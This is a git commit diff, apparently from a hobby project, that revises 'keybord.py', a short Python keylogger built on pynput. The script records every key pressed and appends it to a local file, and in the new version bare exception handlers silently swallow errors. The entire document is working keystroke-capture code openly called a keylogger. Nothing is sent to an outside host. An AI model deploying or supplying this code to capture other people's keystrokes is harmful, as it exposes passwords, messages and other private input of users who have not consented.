b71d5f286eaeb2c2a987102eaf9f0c40b6fb9724
TechnoCraftX <bibekanandapramanik62@gmail.com>
2025-05-19 20:46:03 +0530

    Handle error

--- keybord.py
+++ keybord.py
@@ -1,13 +1,16 @@
-print("start key log")
-
 from pynput.keyboard import Listener
-
-def log_key(key):# Function to log the key that was pressed
-
-    with open("keyv.txt","a") as f:
-        f.write(f"{key}\n")  # Saves the key to the file
-
-with Listener (on_press=log_key) as a:
-   a.join()  # Keeps the listener running, waiting for key presses
-
-#Without join(), the script would start the listener but immediately exit, stopping key press detection before it can log anything.
+print("Keylogger stated")
+def log_key(key):
+    try:
+        with open("keyhis","a")as f:
+            f.write(f"{key}\n")
+    except:
+       pass
+try:
+    
+     with Listener(on_press=log_key) as a:
+         a.join()
+except KeyboardInterrupt:
+    print("Listener stopped by user")
+except :
+        pass    
